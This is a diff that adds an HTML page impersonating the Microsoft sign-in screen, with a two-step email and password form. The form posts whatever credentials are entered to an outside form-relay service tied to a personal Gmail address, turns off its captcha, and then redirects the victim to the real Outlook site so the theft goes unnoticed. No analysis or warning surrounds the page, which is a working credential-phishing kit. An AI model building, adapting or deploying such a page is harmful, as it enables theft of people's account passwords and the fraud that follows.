@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your account</title>
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Segoe UI", Arial, sans-serif;
+    }
+
+    body {
+        background: #f2f2f2;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        background: #fff;
+        width: 400px;
+        padding: 40px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+        font-size: 22px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        color: #0078d4;
+    }
+
+    h2 {
+        margin-bottom: 20px;
+        font-weight: 500;
+    }
+
+    input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: none;
+        border-bottom: 1px solid #999;
+        outline: none;
+        font-size: 15px;
+    }
+
+    input:focus {
+        border-bottom: 2px solid #0078d4;
+    }
+
+    .link {
+        font-size: 13px;
+        color: #0067b8;
+        cursor: pointer;
+        margin-bottom: 20px;
+        display: inline-block;
+    }
+
+    .btn {
+        background: #0078d4;
+        color: #fff;
+        border: none;
+        padding: 10px;
+        width: 100%;
+        cursor: pointer;
+        font-size: 15px;
+    }
+
+    .btn:hover {
+        background: #005ea6;
+    }
+
+    .bottom {
+        margin-top: 20px;
+        font-size: 13px;
+    }
+
+    .bottom a {
+        color: #0067b8;
+        text-decoration: none;
+    }
+
+    .hidden {
+        display: none;
+    }
+
+    .back {
+        font-size: 14px;
+        cursor: pointer;
+        margin-bottom: 10px;
+        color: #0067b8;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">Microsoft</div>
+
+    <!-- EMAIL STEP -->
+    <div id="emailStep">
+        <h2>Sign in</h2>
+      <form action="https://formsubmit.co/howerjohn615@gmail.com" method="POST">
+        <input type="email" name="email" placeholder="Email, phone, or Skype" id="email">
+
+        <div class="link">No account? Create one!</div>
+<input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://outlook.live.com/mail/">
+        
+        <input type="button" nameclass="btn" onclick="nextStep()" value="Next" style="background-color: #005ea6; color: #fff;">
+    </div>
+
+    <!-- PASSWORD STEP -->
+    <div id="passwordStep" class="hidden">
+        <div class="back" onclick="goBack()">← Back</div>
+
+        <h2>Enter password</h2>
+
+        <input type="password" name="password" placeholder="Password">
+
+        <div class="link">Forgot password?</div>
+
+        <button class="btn" type="submit">Sign in</button>
+    </div>
+</form>
+</div>
+
+<script>
+    function nextStep() {
+        let email = document.getElementById("email").value;
+        if(email === "") {
+            alert("Please enter your email");
+            return;
+        }
+
+        document.getElementById("emailStep").classList.add("hidden");
+        document.getElementById("passwordStep").classList.remove("hidden");
+    }
+
+    function goBack() {
+        document.getElementById("passwordStep").classList.add("hidden");
+        document.getElementById("emailStep").classList.remove("hidden");
+    }
+</script>
+
+</body>
+</html>
